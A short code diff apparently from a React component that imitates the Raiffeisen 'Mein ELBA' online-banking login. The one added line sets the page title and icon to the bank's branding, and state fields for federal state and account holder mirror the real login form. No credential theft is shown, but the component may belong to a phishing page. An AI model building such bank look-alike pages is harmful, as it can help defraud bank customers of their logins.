@@ -62,6 +62,7 @@ const Raiffeisenbank = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("Raiffeisen Mein ELBA", raiffeisenIcon);
 
   const [bundesland, setBundesland] = useState("");
   const [verfueger, setVerfueger] = useState("");
